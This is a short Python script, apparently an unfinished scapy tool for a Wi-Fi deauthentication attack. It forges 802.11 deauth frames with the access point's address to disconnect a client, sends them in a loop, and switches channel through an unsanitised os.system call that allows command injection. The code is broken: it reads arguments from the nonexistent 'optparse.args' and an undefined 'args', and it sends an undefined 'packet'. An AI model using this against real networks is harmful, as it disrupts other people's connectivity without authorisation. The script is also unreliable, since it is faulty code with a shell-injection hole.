from scapy.all import *
import optparse
import os

conf.verb = 0

ap = optparse.args.ap
sta = optparse.args.sta
ssid = optparse.args.ssid
ch = optparse.args.ch
iface = optparse.args.iface

START_SEQNUM = 1  # sequence number
SYSTEM_STR = "[\x1b[36m*\x1b[0m]"
WARN_STR = "[\x1b[31m!\x1b[0m]"
INFO_STR = "\x1b[33m-\x1b[0m"

def deauth_attack():

    # Deauthentication
    deauth_frame = RadioTap()\
            /Dot11(type=0, subtype=12, addr1=args.Client, addr2=args.BSSID, addr3=args.BSSID)\
            /Dot11Deauth(reason=7)

    for n in range(int(args.Number)):
        sendp(packet)
        print(f"Deauth sent via: {conf.iface} to BSSID: {args.BSSID} for Client: {args.Client}")

def channel_switch(iface,ch):
    print(WARN_STR+" Channel Switching : Ch."+str(ch))
    os.system('iwconfig ' + iface + ' channel ' + str(ch))

def show_info():
    print(SYSTEM_STR+" Information")
    print("\t"+INFO_STR+" Access Point MAC Address (BSSID) : %s" % ap)
    print("\t"+INFO_STR+" Station MAC Address : %s" % sta)
    print("\t"+INFO_STR+" SSID Information : %s" % ssid)
    print("\t"+INFO_STR+" Channel : Ch.%s" % ch)
    print("\t"+INFO_STR+" Interface : %s" % iface)

if __name__=='__main__':
    deauth_attack()
